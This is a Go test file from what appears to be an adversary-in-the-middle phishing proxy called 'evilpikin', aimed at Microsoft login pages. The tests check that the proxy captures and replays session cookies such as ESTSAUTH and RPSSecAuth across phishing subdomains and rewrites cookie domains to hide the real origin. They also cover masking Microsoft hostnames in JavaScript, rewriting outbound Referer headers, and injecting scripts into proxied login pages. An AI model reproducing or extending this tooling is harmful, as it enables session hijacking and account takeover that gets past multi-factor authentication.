package proxy

import (
	"net/http"
	"net/url"
	"strings"
	"testing"

	"github.com/user/evilpikin/internal/storage"
)

func TestCookieJarCrossDomainSync(t *testing.T) {
	target := &storage.TargetProfile{
		Name:           "ms",
		Origin:         "login.microsoftonline.com",
		ProxyHost:      "ms.test",
		RelatedDomains: map[string]string{"office.com": "office.test"},
	}
	newReq := func() *http.Request {
		up, _ := url.Parse("https://login.microsoftonline.com/login")
		return &http.Request{Method: "GET", URL: up, Host: "login.microsoftonline.com"}
	}
	newResp := func(req *http.Request) *http.Response {
		resp := &http.Response{StatusCode: 302, Header: http.Header{}, Request: req}
		resp.Header.Set("Set-Cookie", "AUTH=secret; Domain=login.microsoftonline.com; Path=/; Secure")
		resp.Header.Set("Location", "https://office.test/landing")
		return resp
	}
	sidOf := func(resp *http.Response) string {
		for _, c := range resp.Cookies() {
			if c.Name == "__ep_sid" {
				return c.Value
			}
		}
		return ""
	}

	// Site-domain mode: the session cookie is shared across every phishing
	// subdomain, so the cross-host sync bounce must be disabled.
	jar := NewCookieJar("evilpikin.test")
	req := newReq()
	resp := newResp(req)
	jar.OnResponse(target, resp, req)
	sid := sidOf(resp)
	if sid == "" {
		t.Fatal("expected __ep_sid cookie to be set by OnResponse")
	}
	if loc := resp.Header.Get("Location"); strings.Contains(loc, "__ep_sync") {
		t.Fatalf("site-domain mode must not bounce, got %q", loc)
	}
	cookies := jar.cookiesForOrigin(sid, "office.com")
	found := false
	for _, c := range cookies {
		if c.Name == "AUTH" && c.Value == "secret" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected AUTH=secret replayed for office.com origin, got %+v", cookies)
	}

	// Legacy per-host mode (no site domain): the bounce is emitted so the
	// session SID is carried across hosts via the URL.
	legacy := NewCookieJar("")
	req2 := newReq()
	resp2 := newResp(req2)
	legacy.OnResponse(target, resp2, req2)
	if sid2 := sidOf(resp2); sid2 == "" {
		t.Fatal("legacy mode: expected __ep_sid cookie")
	}
	loc2 := resp2.Header.Get("Location")
	if !strings.HasPrefix(loc2, "https://office.test/__ep_sync?") || !strings.Contains(loc2, "next=https%3A%2F%2Foffice.test%2Flanding") {
		t.Fatalf("legacy mode: expected Location rewritten to sync bounce, got %q", loc2)
	}
}

func TestRewriteCookieDomainsSiteWide(t *testing.T) {
	resp := &http.Response{Header: http.Header{}}
	resp.Header.Add("Set-Cookie", "ESTSAUTH=tok; Domain=.microsoft.com; Path=/; Secure")
	resp.Header.Add("Set-Cookie", "fpc=1; Path=/; Secure; HttpOnly")
	resp.Header.Add("Set-Cookie", "__ep_sid=keep; Domain=.ms.test")
	rewriteCookieDomains(resp, nil, "ms.test")
	cookies := resp.Header.Values("Set-Cookie")

	byName := map[string]string{}
	for _, c := range cookies {
		byName[strings.SplitN(c, "=", 2)[0]] = c
	}
	// Parent-domain cookie must be remapped to the site-wide domain.
	if !strings.Contains(byName["ESTSAUTH"], "Domain=.ms.test") {
		t.Fatalf("parent-domain cookie not scoped site-wide: %q", byName["ESTSAUTH"])
	}
	// Host-only cookie must be promoted to site-wide so it crosses subdomains.
	if !strings.Contains(byName["fpc"], "Domain=.ms.test") {
		t.Fatalf("host-only cookie not promoted site-wide: %q", byName["fpc"])
	}
	// Our own session cookie must survive untouched.
	if !strings.Contains(byName["__ep_sid"], "__ep_sid=keep") {
		t.Fatalf("__ep_sid mutated: %q", byName["__ep_sid"])
	}
	// No real-origin domain may survive the rewrite.
	for _, c := range cookies {
		if strings.Contains(c, ".microsoft.com") {
			t.Fatalf("real-origin domain leaked: %q", c)
		}
	}
}

func TestCookieJarSessionWideReplay(t *testing.T) {
	// One shared jar across every host of the Microsoft matrix (matches the
	// single-Engine architecture). Site-domain mode => __ep_sid is shared by
	// the browser across all phishing subdomains.
	jar := NewCookieJar("ms.test")

	entTarget := &storage.TargetProfile{Name: "ms", Origin: "login.microsoftonline.com", ProxyHost: "login.ms.test"}
	entReq, _ := http.NewRequest("GET", "https://login.microsoftonline.com/", nil)
	entReq.Host = "login.microsoftonline.com"
	entResp := &http.Response{StatusCode: 200, Header: http.Header{}, Request: entReq}
	entResp.Header.Set("Set-Cookie", "ESTSAUTH=abc; Domain=.microsoft.com; Path=/; Secure; HttpOnly")
	jar.OnResponse(entTarget, entResp, entReq)
	sid := ""
	for _, c := range entResp.Cookies() {
		if c.Name == "__ep_sid" {
			sid = c.Value
		}
	}
	if sid == "" {
		t.Fatal("expected __ep_sid to be issued")
	}

	// The consumer realm (login.live.com) is hit later in the same browser
	// session; the browser carries the same __ep_sid cookie, so OnResponse
	// stores its cookie under the SAME session id.
	consTarget := &storage.TargetProfile{Name: "live", Origin: "login.live.com", ProxyHost: "login-live.ms.test"}
	consReq, _ := http.NewRequest("GET", "https://login.live.com/", nil)
	consReq.Host = "login.live.com"
	consReq.AddCookie(&http.Cookie{Name: "__ep_sid", Value: sid})
	consResp := &http.Response{StatusCode: 200, Header: http.Header{}, Request: consReq}
	consResp.Header.Set("Set-Cookie", "RPSSecAuth=xyz; Domain=.live.com; Path=/; Secure")
	jar.OnResponse(consTarget, consResp, consReq)

	// The modifier replays the entire session bag to whatever upstream it
	// proxies. Assert the enterprise cookie is present even when the request
	// is for the consumer host (the realm-transition scenario).
	all := jar.cookiesForSession(sid)
	have := map[string]string{}
	for _, c := range all {
		have[c.Name] = c.Value
	}
	if have["ESTSAUTH"] != "abc" {
		t.Fatalf("enterprise session cookie missing from session-wide replay: %+v", have)
	}
	if have["RPSSecAuth"] != "xyz" {
		t.Fatalf("consumer session cookie missing from session-wide replay: %+v", have)
	}
}

func TestTransformMasksJavascriptHosts(t *testing.T) {
	raw := []byte(`var u="https://login.microsoftonline.com/consumer/api"; fetch("https://login.live.com/x");`)
	aliasOf := buildAliasMap([]DomainPair{
		{Origin: "login.microsoftonline.com", ProxyHost: "login.ms.test"},
		{Origin: "login.live.com", ProxyHost: "login-live.ms.test"},
	}, "")
	out := string(rewriteHTMLHosts(raw, aliasOf))
	if strings.Contains(out, "login.microsoftonline.com") {
		t.Fatalf("origin leaked in JS: %s", out)
	}
	if !strings.Contains(out, "login.ms.test/consumer/api") {
		t.Fatalf("origin not masked in JS: %s", out)
	}
	if !strings.Contains(out, "login-live.ms.test/x") {
		t.Fatalf("live origin not masked in JS: %s", out)
	}
}

func TestRewriteOutboundReferer(t *testing.T) {
	m := &requestModifier{reverseAlias: buildReverseAlias([]DomainPair{
		{Origin: "login.microsoftonline.com", ProxyHost: "login.ms.test"},
	}, "9443")}
	got := m.rewriteOutboundHosts("https://login.ms.test:9443/foo/bar?x=1")
	if got != "https://login.microsoftonline.com/foo/bar?x=1" {
		t.Fatalf("referer not rewritten: %q", got)
	}
	if m.rewriteOutboundHosts("https://example.com/x") != "https://example.com/x" {
		t.Fatalf("unrelated referer mutated")
	}
	// protocol-relative form also rewritten
	if got := m.rewriteOutboundHosts("//login.ms.test:9443/a"); got != "//login.microsoftonline.com/a" {
		t.Fatalf("protocol-relative referer not rewritten: %q", got)
	}
}

func TestInjectionStreaming(t *testing.T) {
	body := "<head><title>x</title></head><body><p>login</p></body> trailing"
	inj := &storage.InjectionRule{Position: "head", Code: "<script>beacon()</script>"}
	r := strings.NewReader(body)
	out, err := readAll(NewInjectionReader(r, []*storage.InjectionRule{inj}, "/login"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "<script>beacon()</script>") {
		t.Fatalf("head injection missing: %q", out)
	}
	if !strings.Contains(out, "</body> trailing") {
		t.Fatalf("tail preserved: %q", out)
	}
	if !strings.Contains(out, "<head><script>beacon()</script>") {
		t.Fatalf("head injection position wrong: %q", out)
	}
}

func readAll(r interface{ Read([]byte) (int, error) }) (string, error) {
	buf := make([]byte, 4096)
	out := ""
	for {
		n, err := r.Read(buf)
		out += string(buf[:n])
		if err != nil {
			if err.Error() == "EOF" {
				return out, nil
			}
			return out, err
		}
	}
}
